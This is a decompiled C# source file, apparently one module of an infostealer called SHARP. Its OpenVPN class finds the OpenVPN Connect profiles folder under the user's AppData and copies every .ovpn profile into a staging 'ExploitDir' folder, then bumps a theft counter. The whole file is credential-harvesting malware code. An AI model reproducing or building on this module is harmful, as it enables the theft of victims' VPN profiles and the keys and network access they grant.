﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200006C RID: 108
	internal class OpenVPN
	{
		// Token: 0x0600024C RID: 588 RVA: 0x0000EA78 File Offset: 0x0000CC78
		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(exploitDir + "\\VPN\\OpenVPN");
				foreach (string text in Directory.GetFiles(path))
				{
					if (Path.GetExtension(text).Contains("ovpn"))
					{
						File.Copy(text, Path.Combine(exploitDir, "\\VPN\\OpenVPN" + Path.GetFileName(text)));
					}
				}
				Counting.OpenVPN++;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
